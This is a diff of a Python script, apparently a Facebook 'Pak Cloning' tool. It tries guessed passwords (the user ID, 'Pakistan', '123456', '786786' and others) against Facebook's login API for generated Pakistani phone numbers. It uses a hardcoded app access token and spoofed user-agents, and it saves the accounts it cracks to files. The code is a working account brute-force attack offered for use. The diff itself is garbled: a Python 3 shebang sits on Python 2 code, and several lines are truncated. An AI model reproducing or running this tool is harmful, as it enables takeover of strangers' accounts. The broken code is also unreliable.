@@ -1,4 +1,4 @@
-!/usr/bin/python2
+#!/usr/bin/env python3
 #coding=utf-8
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
 os.system('rm -rf .txt')
@@ -36,7 +36,7 @@ br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
 br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
-br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/459[...]')]
 
 def keluar():
 	print 'Thanks.'
@@ -81,7 +81,7 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print  """
 
-                     
+                      
 \033[1;94mFACEBOOK  QINKG TRICKER 
                   
 \033[1;92mFB PAGE   QINKG TRICKER  
@@ -100,30 +100,27 @@ logo1 = """
 ░░███ ░░████  ░███  ░███  ░░█████  ░███ ░░███  
  ░░░██████░██ █████ █████  ░░█████ █████ ░░████
    ░░░░░░ ░░ ░░░░░ ░░░░░    ░░░░░ ░░░░░   ░░░░ 
-                                               
-                                               
-                                               
-                                               
-                                               
-                                               
-                                               
-                                               
-                                               
-                                               
-                                               
-                                               
-                                               
-                                               
-                                  
+                                                
+                                                
+                                                
+                                                
+                                                
+                                                
+                                                
+                                                
+                                                
+                                                
+                                                
+                                                   
    
-                                                                                      
-                                                  
+                                                                                       
+                                                   
 
 ╔══──────────────────────────╗─══╗
 ║OWNER 💓💓💓  Qink Tricker (QT)                              ║
 ║  GITHUB 💝💝💝 QINKG-TRICKER                             ║
 ║ FACEBOOK 💝💝💝QINKG-TRICKER                  ║
-║  ENJOY 💝💝💝Pak Cloning                             ║
+║  ENJOY 💝💝💓Pak Cloning                             ║
 ║   Note 💝💝💝Use Fastest Speed Net             ║
 ╚══──────────────────────────╝─══╝
 
@@ -136,9 +133,9 @@ logo2 = """
    ██║   ██╔══██╗██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    
    ██║   ██║  ██║██║╚██████╗██║  ██╗███████╗██║  ██║    
    ╚═╝   ╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    
-                                                        
-                                                            
-                                                   
+                                                         
+                                                              
+                                                     
                                        ON MY SCRIPT
                                       QINKG TRICKER           
                                         TNX(QT)
@@ -165,7 +162,7 @@ while (loop == 'true'):
     	password = raw_input("\033[1;97m \x1b[1;91mTool Password  \x1b[1;97m» \x1b[1;97m")
         if (password == CorrectPassword):
             print "Logged in successfully as " + username 
-	    time.sleep(2)
+    	    time.sleep(2)
             loop = 'false'
         else:
             print "\033[1;94mWrong Password"
@@ -176,7 +173,7 @@ while (loop == 'true'):
 
 
 numm = [5,2,5,2,2]
-##### LICENSE #####
+##### LICENSE ####_
 #=================#
 def lisensi():
     os.system('clear')
@@ -221,14 +218,14 @@ def Zeek():
 
 def action():
     peak = raw_input('\n\033[1;97m ══CHOOSE:\033[1;97m')
-    if peak =='':
+    if peak == '':
         print '[!] Fill In Correctly'
         action()
     elif peak =="1":              
         os.system("clear")
         print logo2
         print "\033[1;94mEnter any Pakistan Mobile code Number"+'\n'
-        print '\033[1;92mEnter any code 01 02 03 04 05 06 07 08 10 11 12 13 14 15 16 20 21 22 23 24 30 31 32 33 34 35 36 40 41 42 43 44 45 46 47 48 49'
+        print '\x1b[1;92mEnter any code 01 02 03 04 05 06 07 08 10 11 12 13 14 15 16 20 21 22 23 24 30 31 32 33 34 35 36 40 41 42 43 44 45 46 47 48 49'
         for i in numm:
             print('x' * i)
         try:
@@ -262,7 +259,7 @@ def action():
             pass
         try:
             pass1 = user
-            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=[...]
             q = json.load(data)
             if 'access_token' in q:
                 print '\x1b[1;32m[RK-OK]  ' + k + c + user + '  |  ' + pass1                                       
@@ -279,7 +276,7 @@ def action():
                     cpb.append(c+user+pass1)
                 else:
                     pass2 = k + nama + user
-                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '[...]
                     q = json.load(data)
                     if 'access_token' in q:
                         print '\x1b[1;32m[RK-OK]  ' + k + c + user +  '  |  ' + pass2
@@ -296,7 +293,7 @@ def action():
                             cpb.append(c+user+pass2)
                         else:
                             pass3="Pakistan"
-                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c[...]
                             q = json.load(data)
                             if 'access_token' in q:
                                 print '\x1b[1;32m[RK-OK]  ' + k + c + user + '  |  ' + pass3
@@ -313,7 +310,7 @@ def action():
                                     cpb.append(c+user+pass3)
                                 else:
                                     pass4="123456"
-                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&emai[...]
                                     q = json.load(data)
                                     if 'access_token' in q:
                                         print '\x1b[1;32m[RK-OK]  ' + k + c + user + '  |  ' + pass4 
@@ -330,7 +327,7 @@ def action():
                                             cpb.append(c+user+pass4)
                                         else:
                                             pass5="786786"
-                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_versio[...]
                                             q = json.load(data)
                                             if 'access_token' in q:
                                                 print '\x1b[1;32m[RK-OK]  ' + k + c + user + '  |  ' + pass5
@@ -345,18 +342,21 @@ def action():
                                                     cps.write(k+c+user+pass5+'\n')
                                                     cps.close()
                                                     cpb.append(c+user+pass5)
-                                                                                                                                                                                                                
-                                                                                                                                                                                                                
-                                                                                                                                                                                                            
-                                                                                                                                                                                                            
-                                                                                                                                                                                                            
-                                                                                                                                                                                                            
-                                                                                                                                                                                                            
+                                                                                                                                                                                                    [...]
+                                                                                                                                                                                                    [...]
+                                                                                                                                                                                                    [...]
+                                                                                                                                                                                                    [...]
+                                                                                                                                                                                                    [...]
+                                                                                                                                                                                                    [...]
+                                                                                                                                                                                                    [...]
 
 
-                                                                                                                                                                                                            
-                                                                                                                                                                                                                    
-                                                                                                                                                                                                            
+
+                                                                                                                                                                                                    [...]
+                                                                                                                                                                                                    [...]
+                                                                                                                                                                                                    [...]
+
+
 
 
 
